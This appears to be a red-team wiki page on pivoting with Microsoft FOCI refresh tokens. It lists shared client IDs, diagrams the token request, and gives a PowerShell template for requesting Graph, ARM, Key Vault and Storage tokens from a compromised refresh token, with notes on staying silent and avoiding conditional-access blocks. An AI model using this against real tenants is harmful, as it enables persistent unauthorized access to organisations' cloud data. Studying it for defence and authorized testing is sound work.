## Overview

FOCI (Family of Client IDs) is a Microsoft mechanism by which certain first-party client IDs share a refresh token family. When the `/token` endpoint returns `foci: 1` in the response, the refresh token issued is reusable across other client IDs in the same family — without re-authenticating the user.

The attack value is flexibility, not privilege escalation. Permissions are still bounded by the compromised identity. What FOCI unlocks is the ability to pivot to different resource scopes using the same refresh token, potentially accessing audiences that the original acquisition flow didn't cover.

## Requirements

| Requirement | Detail |
|---|---|
| FOCI-eligible refresh token | RT must have been issued for a FOCI client ID. Confirmed by `foci: 1` in the token response. |
| Target client ID | The destination client ID must also be in the FOCI family. |
| Identity permissions | Effective scope is still bounded by the identity's actual permissions — FOCI doesn't grant new rights. |

## Known FOCI Client IDs

```
d3590ed6-52b3-4102-aeff-aad2292ab01c  → Microsoft Office      ← try first
1fec8e78-bce4-4aaf-ab1b-5451cc387264  → Microsoft Teams
5e3ce6c0-2b1f-4285-8d4b-75ee78787346  → Microsoft Outlook
04b07795-8ddb-461a-bbee-02f9e1bf7b46  → Azure CLI             ← often fails
```

## Attack Chain

```
[Compromised RT]
     │  foci: 1 confirmed
     ▼
POST /oauth2/v2.0/token
     client_id     = <FOCI_CLIENT_ID>
     grant_type    = refresh_token
     refresh_token = <RT>
     scope         = <TARGET_RESOURCE>/.default
     │
     ▼
New access_token for target resource
```

## Resource Scope Pivot

With a working FOCI client ID, request access tokens for each attack plane:

```powershell
$scopes = @{
    Graph   = "https://graph.microsoft.com/.default"
    ARM     = "https://management.azure.com/.default"
    KV      = "https://vault.azure.net/.default"
    Storage = "https://storage.azure.com/.default"
}

foreach ($resource in $scopes.GetEnumerator()) {
    $body = @{
        grant_type    = "refresh_token"
        client_id     = "<FOCI_CLIENT_ID>"
        refresh_token = "<RT>"
        scope         = $resource.Value
    }
    # POST to /oauth2/v2.0/token — check response per resource
}
```

## Operator Notes

- Validate FOCI eligibility before pivoting — not all RTs carry `foci: 1`. Check the initial acquisition response.
- The refresh token is not consumed or invalidated when used with a different client ID. Each pivot issues a new AT without touching the RT.
- Using the RT does not generate an interactive auth event. The operation is silent from a user-facing perspective.
- If the first FOCI client ID fails, try others from the list — tenant CA policies may block specific client IDs.
- The AT lifetime is ~1 hour per resource. RT is valid for 90 days with activity — refresh the AT as needed without re-phishing.

## Tooling

FOCI detection and scope pivoting are supported by `get_token.ps1` (FOCI mode) from the Operator Toolkit. See GitHub reference.
